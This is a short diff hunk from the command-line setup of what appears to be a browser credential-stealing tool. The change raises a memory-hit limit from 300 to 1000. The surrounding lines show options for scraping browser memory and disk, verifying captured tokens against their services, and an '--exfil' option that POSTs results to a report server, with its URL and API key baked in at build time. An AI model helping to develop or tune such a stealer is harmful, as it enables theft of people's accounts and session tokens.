@@ -1827,7 +1827,7 @@ def main():
     parser.add_argument("--disk-only",   action="store_true", default=_DEFAULT_DISK_ONLY,   help="Skip memory scraping")
     parser.add_argument("--memory-only", action="store_true", default=_DEFAULT_MEMORY_ONLY, help="Skip disk extraction")
     parser.add_argument("--out",         metavar="PATH",      help="Output file path (default: none when server is baked in, otherwise bb_results.txt next to exe)")
-    parser.add_argument("--max-hits",    type=int, default=_DEFAULT_MAX_HITS, help="Max memory hits per browser before dedup (default: 300)")
+    parser.add_argument("--max-hits",    type=int, default=_DEFAULT_MAX_HITS, help="Max memory hits per browser before dedup (default: 1000)")
     parser.add_argument("--verify",      action="store_true", default=_DEFAULT_VERIFY,      help="Verify captured tokens against their services (makes outbound requests)")
     parser.add_argument("--exfil",       metavar="URL",       default=_EXFIL_URL or None, help="POST results to report server (default: baked in at build time)")
     parser.add_argument("--exfil-key",   metavar="KEY",       default=_EXFIL_KEY or None, help="API key for --exfil (default: baked in at build time)")
